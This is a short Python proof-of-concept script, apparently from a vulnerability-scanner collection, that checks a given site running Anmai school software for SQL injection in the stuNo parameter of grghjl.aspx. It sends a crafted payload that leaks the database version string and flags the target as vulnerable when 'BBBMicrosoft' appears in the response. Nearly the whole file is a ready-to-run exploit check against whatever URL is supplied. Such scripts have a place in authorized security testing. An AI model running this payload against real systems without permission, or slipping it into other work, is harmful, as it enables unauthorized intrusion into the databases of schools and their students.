#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安脉grghjl.aspx 参数stuNo注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0102420
author: Lucifer
description: 文件/anmai/Edis/DiathesisAppraise/grghjl.aspx中,参数stuNo存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class anmai_grghjl_stuNo_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/anmai/Edis/DiathesisAppraise/grghjl.aspx?stuNo=1%27AnD(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIon)>0--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在安脉grghjl.aspx 参数stuNo注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = anmai_grghjl_stuNo_sqli_BaseVerify(sys.argv[1])
    testVuln.run()